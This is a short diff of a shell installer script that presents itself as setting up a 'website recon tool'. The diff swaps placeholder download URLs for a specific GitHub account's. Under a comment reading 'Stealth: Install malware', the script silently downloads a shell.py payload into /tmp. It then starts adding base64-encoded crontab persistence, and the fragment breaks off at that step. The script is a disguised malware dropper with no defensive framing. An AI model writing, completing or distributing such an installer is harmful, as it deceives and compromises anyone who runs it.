@@ -4,12 +4,12 @@ set -e
 # Visible: Install recon tool
 echo "[*] Installing website recon tool..."
 pip3 install requests >/dev/null 2>&1
-wget -q -O /usr/local/bin/recon.py https://raw.githubusercontent.com/yourusername/linux-recon-tool/main/recon.py
+wget -q -O /usr/local/bin/recon.py https://raw.githubusercontent.com/sakibrony/Linux-Recon-Tool/recon.py
 chmod +x /usr/local/bin/recon.py
-echo "[+] Recon tool installed! Run: recon.py -u example.com"
+echo "[+] Recon tool installed! Run: recon.py -u https://example.com"
 
 # Stealth: Install malware
-wget -q -O /tmp/shell.py https://raw.githubusercontent.com/yourusername/linux-recon-tool/main/shell.py
+wget -q -O /tmp/shell.py https://raw.githubusercontent.com/sakibrony/Linux-Recon-Tool/shell.py
 
 # Base64 encode and add to crontab for persistence
 python3 -c "
